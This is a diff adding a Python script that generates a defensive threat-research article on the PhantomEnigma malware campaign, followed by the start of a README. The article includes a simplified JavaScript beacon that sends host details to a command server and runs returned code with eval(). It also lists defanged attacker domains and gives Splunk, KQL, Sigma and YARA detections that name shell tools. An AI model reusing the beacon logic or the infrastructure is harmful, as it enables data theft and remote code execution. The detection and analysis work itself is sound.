@@ -1,0 +1,567 @@
+from pathlib import Path
+import zipfile, textwrap, html
+
+root = Path("/mnt/data/phantomenigma-github")
+article_dir = root / "research" / "phantomenigma"
+article_dir.mkdir(parents=True, exist_ok=True)
+
+index_html = r'''<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="PhantomEnigma threat research: government infrastructure abuse, Node.js and Electron malware, rotating C2, and behavior-based detection engineering.">
+  <meta property="og:title" content="PhantomEnigma — When Trust Becomes the Initial Access Vector">
+  <meta property="og:description" content="A defender-focused analysis of compromised government infrastructure, modular Electron malware, and durable threat hunting strategies.">
+  <meta property="og:type" content="article">
+  <title>PhantomEnigma — Threat Research | Gopichand Murari</title>
+  <style>
+    :root {
+      --bg:#07111f; --panel:#0d1b2a; --panel2:#11243a; --text:#e7eef7;
+      --muted:#9fb2c7; --accent:#42d3ff; --accent2:#7cf7c8;
+      --border:#203a55; --danger:#ff6b6b; --warn:#ffd166;
+    }
+    * { box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+    body {
+      margin:0; font-family:Inter,Segoe UI,Arial,sans-serif;
+      background:linear-gradient(180deg,#06101d,#0a1727 45%,#07111f);
+      color:var(--text); line-height:1.72;
+    }
+    .progress { position:fixed; top:0; left:0; height:3px; background:var(--accent); width:0; z-index:1000; }
+    .topbar {
+      position:sticky; top:0; z-index:100; backdrop-filter:blur(12px);
+      background:rgba(7,17,31,.87); border-bottom:1px solid var(--border);
+    }
+    .topbar-inner {
+      max-width:1180px; margin:auto; padding:14px 22px;
+      display:flex; justify-content:space-between; align-items:center; gap:20px;
+    }
+    .brand { font-weight:800; letter-spacing:.08em; }
+    .topbar a { color:var(--text); text-decoration:none; }
+    .back { color:var(--accent)!important; font-weight:700; }
+    .hero { max-width:1180px; margin:0 auto; padding:72px 22px 40px; }
+    .eyebrow { color:var(--accent2); text-transform:uppercase; letter-spacing:.16em; font-weight:800; font-size:.78rem; }
+    .hero h1 { font-size:clamp(2.35rem,6vw,5rem); line-height:1.03; margin:.4rem 0 1rem; }
+    .hero p { max-width:870px; color:var(--muted); font-size:1.14rem; }
+    .meta { display:flex; gap:12px; flex-wrap:wrap; margin-top:24px; }
+    .chip { border:1px solid var(--border); background:rgba(17,36,58,.75); padding:8px 12px; border-radius:999px; color:#d8e6f5; font-size:.9rem; }
+    .layout { max-width:1180px; margin:auto; padding:0 22px 80px; display:grid; grid-template-columns:250px minmax(0,1fr); gap:34px; }
+    aside { position:sticky; top:78px; align-self:start; max-height:calc(100vh - 100px); overflow:auto; padding:18px; background:rgba(13,27,42,.72); border:1px solid var(--border); border-radius:16px; }
+    aside strong { display:block; margin-bottom:10px; }
+    aside a { display:block; color:var(--muted); text-decoration:none; padding:5px 0; font-size:.9rem; }
+    aside a:hover { color:var(--accent); }
+    article { min-width:0; background:rgba(13,27,42,.58); border:1px solid var(--border); border-radius:20px; padding:clamp(22px,5vw,56px); box-shadow:0 20px 60px rgba(0,0,0,.25); }
+    h1,h2,h3,h4 { line-height:1.25; scroll-margin-top:90px; }
+    h2 { margin-top:2.6rem; padding-bottom:.55rem; border-bottom:1px solid var(--border); }
+    h3 { margin-top:2rem; color:#dff7ff; }
+    p,li { color:#c8d5e3; }
+    a { color:var(--accent); }
+    hr { border:0; border-top:1px solid var(--border); margin:2.5rem 0; }
+    code { font-family:Consolas,Monaco,monospace; background:#07111f; color:#9df7d2; padding:.14rem .38rem; border-radius:5px; }
+    pre { overflow:auto; padding:20px; border:1px solid #254766; border-radius:14px; background:#050c15; box-shadow:inset 0 0 0 1px rgba(255,255,255,.02); }
+    pre code { padding:0; background:none; color:#d7f9e8; }
+    blockquote { margin:1.4rem 0; border-left:4px solid var(--accent); background:rgba(66,211,255,.07); padding:14px 18px; border-radius:0 10px 10px 0; color:#dcecf8; }
+    .callout { margin:1.5rem 0; padding:16px 18px; border-radius:12px; border:1px solid var(--border); background:var(--panel2); }
+    .callout strong { display:block; margin-bottom:5px; text-transform:uppercase; letter-spacing:.08em; font-size:.8rem; }
+    .callout.warning { border-left:4px solid var(--warn); }
+    .callout.important { border-left:4px solid var(--danger); }
+    .callout.note,.callout.tip { border-left:4px solid var(--accent2); }
+    .callout p { margin:0; }
+    .table-wrap { overflow:auto; margin:1.25rem 0; border:1px solid var(--border); border-radius:12px; }
+    table { border-collapse:collapse; width:100%; min-width:650px; }
+    th,td { padding:12px 14px; border-bottom:1px solid var(--border); text-align:left; vertical-align:top; }
+    th { background:#10243a; color:#f0f8ff; }
+    tr:last-child td { border-bottom:0; }
+    .flow { text-align:center; color:#d7f9e8; font-weight:700; }
+    footer { text-align:center; color:var(--muted); padding:30px 20px 50px; }
+    @media (max-width:900px) {
+      .layout { grid-template-columns:1fr; }
+      aside { position:relative; top:auto; max-height:none; }
+    }
+  </style>
+</head>
+<body>
+<div class="progress" id="progress"></div>
+
+<nav class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="/">◆ GOPICHAND MURARI</a>
+    <a class="back" href="/#research">← Back to Research</a>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="eyebrow">Threat Research · Detection Engineering</div>
+  <h1>When Trust Becomes the Initial Access Vector</h1>
+  <p><strong>Hunting PhantomEnigma:</strong> a defender-focused analysis of compromised government infrastructure, Delphi/Inno installers, Electron and Node.js abuse, rotating command-and-control, and the detection signals that survive infrastructure changes.</p>
+  <div class="meta">
+    <span class="chip">PhantomEnigma</span>
+    <span class="chip">Node.js / Electron</span>
+    <span class="chip">Threat Hunting</span>
+    <span class="chip">Detection Engineering</span>
+    <span class="chip">MITRE ATT&amp;CK</span>
+    <span class="chip">July 2026</span>
+  </div>
+</header>
+
+<div class="layout">
+  <aside>
+    <strong>On this page</strong>
+    <a href="#executive-summary">Executive Summary</a>
+    <a href="#why-it-matters">Why This Matters</a>
+    <a href="#attack-chain">Attack Chain</a>
+    <a href="#malware">Inside the Backdoor</a>
+    <a href="#infrastructure">Infrastructure</a>
+    <a href="#hunting">Threat Hunting</a>
+    <a href="#detections">Detection Content</a>
+    <a href="#mitre">MITRE ATT&amp;CK</a>
+    <a href="#response">Incident Response</a>
+    <a href="#conclusion">Conclusion</a>
+  </aside>
+
+  <article>
+    <div class="callout important">
+      <strong>Research note</strong>
+      <p>This article is an independent defensive analysis based primarily on ANY.RUN's PhantomEnigma investigation. It does not claim discovery of the original campaign. Indicators are defanged, and all detection content should be validated and tuned before production use.</p>
+    </div>
+
+    <h1 id="executive-summary">Executive Summary</h1>
+    <p>Security teams are trained to distrust spoofed domains, failed authentication checks, and unfamiliar websites. PhantomEnigma demonstrates the opposite problem: an attack can appear credible because the infrastructure is genuinely trusted.</p>
+    <p>The operation abused compromised Brazilian government mailboxes and web portals as part of its delivery chain. In this situation, SPF, DKIM, and DMARC may all pass—not because the message is safe, but because the attacker is sending through infrastructure that has already been compromised.</p>
+    <p>The malware chain combines a Delphi-compiled Inno Setup installer with a patched Electron or Node.js application. A malicious <code>resources\app\index.js</code> performs system discovery, persistence, C2 beaconing, JavaScript execution, and second-stage payload delivery.</p>
+    <p>The most important defensive lesson is that domains, IP addresses, and lure names rotate quickly. The build chain and behavioral relationships are harder to change. ANY.RUN identified 231 sandbox sessions sharing the recurring Node.js and Inno Setup combination, while the known C2 seed set covered only a minority of that wider cluster.</p>
+
+    <div class="callout tip">
+      <strong>Core detection principle</strong>
+      <p>Do not hunt only for where the malware connects. Hunt for how it is built, launched, persisted, and used to execute follow-on activity.</p>
+    </div>
+
+    <hr>
+
+    <h1 id="why-it-matters">Why This Case Matters</h1>
+    <blockquote>PhantomEnigma did not simply bypass trust controls. It weaponized the conditions that make users and security products trust a message.</blockquote>
+    <p>Email authentication answers a narrow question: was the sender authorized to use the sending domain? It does not answer whether the mailbox, server, or domain itself has been compromised.</p>
+    <p>This creates a visibility gap. A recipient may see a legitimate government domain. The secure email gateway may see passing authentication. The browser may see HTTPS. The SOC may initially see unrelated alerts: a downloaded installer, an Electron application, a Run-key change, and periodic web traffic.</p>
+    <p>The incident becomes clear only when those signals are correlated.</p>
+
+    <h2>Threat profile</h2>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Category</th><th>Observed characteristics</th></tr></thead>
+        <tbody>
+          <tr><td>Operation</td><td>Brazil-focused, multi-arm crimeware cluster</td></tr>
+          <tr><td>Delivery</td><td>Compromised government mailboxes, portals, QR-code and police/notary lures</td></tr>
+          <tr><td>Installer</td><td>Delphi-compiled Inno Setup package</td></tr>
+          <tr><td>Runtime</td><td>Patched Electron/Boostnote-style application with malicious Node.js</td></tr>
+          <tr><td>Persistence</td><td>Run keys and Electron login-item settings</td></tr>
+          <tr><td>C2</td><td>Rotating domains, web protocols, GET and POST beacon generations</td></tr>
+          <tr><td>Risk</td><td>Credential theft, remote execution, payload delivery, data exposure, fraud and disruption</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr>
+
+    <h1 id="attack-chain">Attack Chain</h1>
+    <pre class="flow"><code>Compromised government mailbox
+              ↓
+Police / notary-themed phishing lure
+              ↓
+Compromised .gov.br portal or typosquat
+              ↓
+Delphi / Inno Setup installer
+              ↓
+Temporary Electron application
+              ↓
+Malicious resources\app\index.js
+              ↓
+System discovery + machine identifier
+              ↓
+Run-key / login-item persistence
+              ↓
+Periodic HTTP beacon
+              ↓
+JavaScript eval or dropped executable</code></pre>
+
+    <h2>1. Trusted phishing delivery</h2>
+    <p>The lure impersonates official Polícia Civil or “Procuração Digital” communications. Some activity also used QR-code documents and ClickFix-style social engineering. The delivery link may point to a compromised government host or a police-themed typosquatted domain.</p>
+    <p>The key distinction is that compromised government systems were used as delivery infrastructure. They should not automatically be treated as confirmed campaign victims or attacker-owned infrastructure.</p>
+
+    <h2>2. Silent installer execution</h2>
+    <p>The victim launches an installer such as <code>Procuracao_Digital.exe</code>. The Delphi/Inno package silently extracts an application into an Inno temporary directory:</p>
+    <pre><code>%TEMP%\is-*.tmp\&lt;RandomName&gt;Application\</code></pre>
+    <p>Observed naming patterns included random combinations such as <code>DistroniceApplication</code>, <code>SmartSuiteifyUltraWare</code>, and similar synthetic product names.</p>
+
+    <h2>3. Electron application abuse</h2>
+    <p>The extracted application appears to be a normal Electron program. Observed executable names included <code>App.exe</code>, <code>Boost Note.exe</code>, and later <code>Grape.exe</code>.</p>
+    <p>Electron loads JavaScript from the application resources directory. PhantomEnigma abuses that design by placing malicious logic inside:</p>
+    <pre><code>resources\app\index.js</code></pre>
+    <p>The executable may look ordinary. The process relationship is not.</p>
+
+    <h2>4. Discovery and victim registration</h2>
+    <p>The backdoor collects host details including the computer name, username, campaign tag, and a persistent eight-character machine identifier stored in the user profile.</p>
+
+    <h2>5. Persistence and beaconing</h2>
+    <p>The malware can establish startup persistence through a Windows Run key or Electron's <code>setLoginItemSettings()</code> functionality. It then checks for commands at a regular interval—approximately every 180 seconds in the newly analyzed generation.</p>
+
+    <h2>6. Modular task execution</h2>
+    <p>The server can return JavaScript for in-process execution through <code>eval()</code>, or send Base64-encoded files that are written to disk and launched. This allows the operator to choose a stealer, loader, remote-management tool, or other payload after the initial compromise.</p>
+
+    <hr>
+
+    <h1 id="malware">Inside the Backdoor</h1>
+    <p>ANY.RUN analysts recovered and statically deobfuscated a large <code>index.js</code> file without executing the code through Node.js or <code>eval()</code>. The analysis identified multiple string-obfuscation layers and a distinct beacon generation.</p>
+
+    <h2>Simplified behavior</h2>
+    <pre><code class="language-javascript">async function beacon() {
+  const host = resolveCommandServer();
+
+  const response = await fetch(host + "/nbw/", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify([
+      machineId(),
+      process.env.COMPUTERNAME,
+      process.env.USERNAME,
+      campaignTag()
+    ])
+  });
+
+  const task = await response.json();
+
+  if (task.e) {
+    eval(task.e);
+  }
+
+  if (task.files) {
+    // Decode, write and execute delivered files.
+  }
+}</code></pre>
+
+    <div class="callout warning">
+      <strong>Detection implication</strong>
+      <p>An Electron application that creates persistence, performs host discovery, launches command interpreters, or downloads executables should be investigated even when its filename resembles a legitimate desktop application.</p>
+    </div>
+
+    <h2>Two beacon generations</h2>
+    <p>The campaign used at least two communication formats:</p>
+    <pre><code>GET /laravel.php?api=api&amp;hash=&lt;base64&gt;&amp;message=PT1n&lt;base64&gt;
+
+POST /nbw/
+Content-Type: application/json</code></pre>
+    <p>The protocol changed, but the surrounding build chain remained recognizable: Delphi/Inno delivery, patched Electron, modular JavaScript or executable tasking, and startup persistence.</p>
+
+    <hr>
+
+    <h1 id="infrastructure">Infrastructure: What to Block and What Not to Paint</h1>
+    <p>The operation used multiple infrastructure tiers:</p>
+    <ul>
+      <li><strong>Compromised delivery surface:</strong> legitimate Brazilian government and public-sector portals.</li>
+      <li><strong>Delivery and C2 domains:</strong> police-themed typosquats and randomly generated-looking <code>.com</code> domains.</li>
+      <li><strong>Proxy layer:</strong> Cloudflare-fronted domains.</li>
+      <li><strong>Origin and beaconing tiers:</strong> separate hosting and bare-IP infrastructure.</li>
+    </ul>
+    <p>Cloudflare co-hosting is not attribution. Shared edge IP space hosts large numbers of unrelated sites. Likewise, legitimate government hosts used for delivery should not be broadly blocked without considering business impact.</p>
+
+    <h2>Examples of reported operator-controlled domains</h2>
+    <pre><code>policiacivilmg[.]com
+pccvill[.]com
+pccvioo[.]com
+dahieenloo[.]com
+psznaoehteeh[.]com
+taaeiuep[.]com
+eeresofeuae[.]com
+zsxocjarsate[.]com</code></pre>
+
+    <div class="callout note">
+      <strong>Attribution discipline</strong>
+      <p>Separate attacker-controlled infrastructure from compromised third-party infrastructure and shared CDN space. Blocking and attribution decisions require different confidence thresholds.</p>
+    </div>
+
+    <hr>
+
+    <h1 id="hunting">Threat Hunting Strategy</h1>
+    <p>A durable hunt should combine high-confidence campaign indicators with broader build-chain and behavioral signals.</p>
+
+    <h2>Layer 1: Campaign-specific indicators</h2>
+    <ul>
+      <li>Known operator domains and beacon IPs</li>
+      <li><code>/nbw/</code> POST requests</li>
+      <li><code>/laravel.php?api=api</code> requests</li>
+      <li>Known hashes and confirmed delivery URLs</li>
+    </ul>
+
+    <h2>Layer 2: Build-chain characteristics</h2>
+    <ul>
+      <li>Delphi-compiled Inno Setup installer</li>
+      <li>Embedded Node.js or Electron application</li>
+      <li><code>resources\app\index.js</code> created under an Inno temporary path</li>
+      <li>Renamed or patched Boostnote-style application</li>
+    </ul>
+
+    <h2>Layer 3: Behavioral sequence</h2>
+    <pre class="flow"><code>Inno extraction
+   → Electron execution
+      → index.js activity
+         → system discovery
+            → startup persistence
+               → periodic HTTP
+                  → PowerShell / cmd / dropped EXE</code></pre>
+
+    <h2>Telemetry checklist</h2>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Source</th><th>What to collect</th><th>High-value signal</th></tr></thead>
+        <tbody>
+          <tr><td>EDR / Sysmon</td><td>Process tree, command line, hashes, signer, user, integrity</td><td>Electron spawning shells, scripts, discovery tools or unknown executables</td></tr>
+          <tr><td>File telemetry</td><td>Created paths, hashes, signer, file age</td><td><code>resources\app\index.js</code> under <code>is-*.tmp</code></td></tr>
+          <tr><td>Registry</td><td>Run-key changes and value data</td><td>Startup entry pointing into Temp or AppData</td></tr>
+          <tr><td>Network</td><td>URL path, method, process, interval, DNS history</td><td><code>/nbw/</code>, Laravel path, or near-180-second periodicity</td></tr>
+          <tr><td>Email</td><td>Headers, URLs, QR destinations, sender history</td><td>Authenticated message from a newly compromised trusted mailbox</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr>
+
+    <h1 id="detections">Detection Content</h1>
+
+    <h2>Splunk: Electron spawning suspicious children</h2>
+    <pre><code class="language-spl">index=endpoint
+(
+  parent_process_name="App.exe"
+  OR parent_process_name="Boost Note.exe"
+  OR parent_process_name="Grape.exe"
+)
+(
+  process_name="powershell.exe"
+  OR process_name="cmd.exe"
+  OR process_name="wscript.exe"
+  OR process_name="cscript.exe"
+  OR process_name="reg.exe"
+  OR process_name="wmic.exe"
+)
+| table _time host user parent_process_name parent_process_path
+        process_name process_path process_command_line
+| sort - _time</code></pre>
+
+    <h2>Splunk: periodic beaconing near 180 seconds</h2>
+    <pre><code class="language-spl">index=network
+| sort 0 src_ip dest_ip dest_port _time
+| streamstats current=f last(_time) AS previous_time
+    by src_ip dest_ip dest_port
+| eval interval=_time-previous_time
+| where interval&gt;=170 AND interval&lt;=190
+| stats count avg(interval) AS avg_interval
+        stdev(interval) AS interval_variance
+        by src_ip dest_ip dest_port
+| where count&gt;=4 AND interval_variance&lt;15</code></pre>
+
+    <h2>Microsoft Defender XDR / Sentinel KQL</h2>
+    <pre><code class="language-kql">DeviceProcessEvents
+| where InitiatingProcessFileName in~ (
+    "App.exe",
+    "Boost Note.exe",
+    "Grape.exe"
+)
+| where FileName in~ (
+    "powershell.exe",
+    "cmd.exe",
+    "wscript.exe",
+    "cscript.exe",
+    "reg.exe",
+    "wmic.exe"
+)
+| project Timestamp, DeviceName, AccountName,
+          InitiatingProcessFileName,
+          InitiatingProcessFolderPath,
+          FileName, FolderPath,
+          ProcessCommandLine, SHA256
+| order by Timestamp desc</code></pre>
+
+    <h2>KQL: suspicious Electron application artifact</h2>
+    <pre><code class="language-kql">DeviceFileEvents
+| where FileName =~ "index.js"
+| where FolderPath contains @"\resources\app\"
+| where FolderPath contains @"\Temp\is-"
+| project Timestamp, DeviceName,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine,
+          FolderPath, SHA256, FileSize</code></pre>
+
+    <h2>Sigma: Electron application spawning a command interpreter</h2>
+    <pre><code class="language-yaml">title: Suspicious Electron Application Spawning Command Shell
+id: 63ac8d33-c11d-4aca-9bc9-3c4fa83e61e4
+status: experimental
+description: Detects Electron or Boostnote-related executables spawning
+  command interpreters associated with PhantomEnigma-like activity.
+author: Gopichand Murari
+date: 2026-07-17
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  parent:
+    ParentImage|endswith:
+      - '\App.exe'
+      - '\Boost Note.exe'
+      - '\Grape.exe'
+  child:
+    Image|endswith:
+      - '\powershell.exe'
+      - '\cmd.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+      - '\reg.exe'
+      - '\wmic.exe'
+  condition: parent and child
+falsepositives:
+  - Authorized Electron development or administration tools
+level: high
+tags:
+  - attack.execution
+  - attack.t1059.001
+  - attack.t1059.007</code></pre>
+
+    <h2>YARA concept for extracted JavaScript</h2>
+    <pre><code class="language-yara">rule PhantomEnigma_Node_Electron_Backdoor
+{
+  meta:
+    description = "Detects characteristics of PhantomEnigma-like Electron backdoor"
+    author = "Gopichand Murari"
+    status = "Experimental"
+
+  strings:
+    $s1 = "setLoginItemSettings" ascii wide
+    $s2 = "child_process" ascii wide
+    $s3 = "COMPUTERNAME" ascii wide
+    $s4 = "USERNAME" ascii wide
+    $s5 = "/nbw/" ascii wide
+    $s6 = "taskExecute" ascii wide
+
+  condition:
+    filesize &lt; 20MB and 4 of ($s*)
+}</code></pre>
+
+    <div class="callout warning">
+      <strong>Tuning required</strong>
+      <p>Electron and Inno Setup are widely used by legitimate software. Production detections should combine path, parent-child relationship, persistence, network activity, signer information, file prevalence, and user context.</p>
+    </div>
+
+    <hr>
+
+    <h1 id="mitre">MITRE ATT&amp;CK Mapping</h1>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tactic</th><th>Technique</th><th>ID</th><th>Observed use</th></tr></thead>
+        <tbody>
+          <tr><td>Resource Development</td><td>Compromise Infrastructure</td><td>T1584</td><td>Compromised government mail and web infrastructure</td></tr>
+          <tr><td>Initial Access</td><td>Spearphishing Link</td><td>T1566.002</td><td>Police and notary-themed delivery links</td></tr>
+          <tr><td>Execution</td><td>User Execution: Malicious File</td><td>T1204.002</td><td>User launches the installer</td></tr>
+          <tr><td>Execution</td><td>PowerShell</td><td>T1059.001</td><td>Follow-on command execution</td></tr>
+          <tr><td>Execution</td><td>JavaScript/JScript</td><td>T1059.007</td><td>Malicious Node.js and task execution</td></tr>
+          <tr><td>Defense Evasion</td><td>Obfuscated Files or Information</td><td>T1027</td><td>Encoded and self-deobfuscating JavaScript</td></tr>
+          <tr><td>Defense Evasion</td><td>Masquerading</td><td>T1036</td><td>Renamed applications and official-themed lures</td></tr>
+          <tr><td>Persistence</td><td>Registry Run Keys / Startup Folder</td><td>T1547.001</td><td>Startup persistence</td></tr>
+          <tr><td>Discovery</td><td>System Information Discovery</td><td>T1082</td><td>Computer and user information collection</td></tr>
+          <tr><td>Command and Control</td><td>Web Protocols</td><td>T1071.001</td><td>GET and POST beaconing</td></tr>
+          <tr><td>Command and Control</td><td>Ingress Tool Transfer</td><td>T1105</td><td>Delivery of executable second stages</td></tr>
+          <tr><td>Exfiltration</td><td>Exfiltration Over C2 Channel</td><td>T1041</td><td>System information sent through the beacon</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr>
+
+    <h1 id="response">Incident Response Priorities</h1>
+    <h2>Immediate containment</h2>
+    <ol>
+      <li>Isolate affected endpoints.</li>
+      <li>Preserve the original email, headers, URLs, QR destination, and downloaded files.</li>
+      <li>Reset exposed credentials and revoke active sessions where compromise is suspected.</li>
+      <li>Block confirmed attacker-controlled domains and IPs.</li>
+      <li>Avoid broadly blocking legitimate government domains used as compromised delivery hosts.</li>
+      <li>Terminate malicious Electron, PowerShell, shell, and second-stage processes.</li>
+    </ol>
+
+    <h2>Enterprise scoping</h2>
+    <ul>
+      <li><code>App.exe</code> or renamed Electron binaries under <code>is-*.tmp</code></li>
+      <li><code>resources\app\index.js</code> created by an installer</li>
+      <li>Run-key values referencing Temp or AppData</li>
+      <li><code>POST /nbw/</code> and <code>GET /laravel.php?api=api</code></li>
+      <li>Electron applications launching PowerShell, CMD, WMI, registry tools, or unknown executables</li>
+      <li>Regular network intervals near 180 seconds</li>
+    </ul>
+
+    <h2>Eradication and recovery</h2>
+    <ol>
+      <li>Remove the installer, extracted application, persistence entries, machine identifiers, and second-stage payloads.</li>
+      <li>Reimage systems when payload scope cannot be established with confidence.</li>
+      <li>Restore from a verified clean state.</li>
+      <li>Confirm that beaconing and persistence do not return.</li>
+      <li>Review the sender mailbox and trusted infrastructure for additional malicious messages.</li>
+    </ol>
+
+    <hr>
+
+    <h1 id="conclusion">Analyst Conclusion</h1>
+    <p>PhantomEnigma is not important simply because it used phishing, Node.js, or rotating domains. It is important because it demonstrates how an attacker can combine trusted infrastructure and ordinary software frameworks to make malicious activity look normal at every individual stage.</p>
+    <p>A legitimate domain can be compromised. An authenticated email can still be malicious. An Electron application can become a backdoor host. A clean automated verdict can hide a malicious build chain. A new C2 domain can make yesterday's blocklist obsolete.</p>
+    <p>Defenders need detections that connect these events:</p>
+    <pre class="flow"><code>Trust anomaly
+   + unusual installer chain
+   + Electron child process
+   + persistence
+   + periodic beaconing
+   = high-confidence investigation</code></pre>
+    <p>The most durable indicator in this campaign was not a single hash, IP address, or domain. It was the attacker's engineering pattern.</p>
+
+    <div class="callout important">
+      <strong>Final takeaway</strong>
+      <p>Infrastructure tells us where the attacker operated yesterday. Behavior and build-chain evidence help us detect how the attacker will operate tomorrow.</p>
+    </div>
+
+    <hr>
+
+    <h1 id="references">References</h1>
+    <p><strong>Primary research:</strong> ANY.RUN — <em>Hidden Infrastructure Exposed: ANY.RUN Reveals Hijacked Gov Websites Delivering Malware</em>, July 2026.</p>
+    <p><strong>Research scope:</strong> This article independently restructures and interprets the reported findings for cybersecurity education, threat hunting, defensive detection engineering, SOC training, and portfolio demonstration.</p>
+
+    <h2>Disclaimer</h2>
+    <p>Indicators can expire, infrastructure can be reassigned, and detection logic can generate false positives. Validate current ownership, business context, and telemetry before taking blocking or containment actions.</p>
+  </article>
+</div>
+
+<footer>© 2026 Gopichand Murari · Threat Research Portfolio</footer>
+
+<script>
+  window.addEventListener('scroll', () => {
+    const doc = document.documentElement;
+    const max = doc.scrollHeight - doc.clientHeight;
+    const pct = max > 0 ? (doc.scrollTop / max) * 100 : 0;
+    document.getElementById('progress').style.width = pct + '%';
+  });
+</script>
+</body>
+</html>
+'''
+
+(article_dir / "index.html").write_text(index_html, encoding="utf-8")
+
+readme = """# PhantomEnigma GitHub Pages Article
+
+## Upload location
+
+Place the folder exactly here in your repository:
+
+```text
+gopi-murari.github.io/
+├── index.html
+├── style.css
+└── research/
+    ├── jadepuffer/
+    │   └── index.html
+    └── phantomenigma/
+        └── index.html
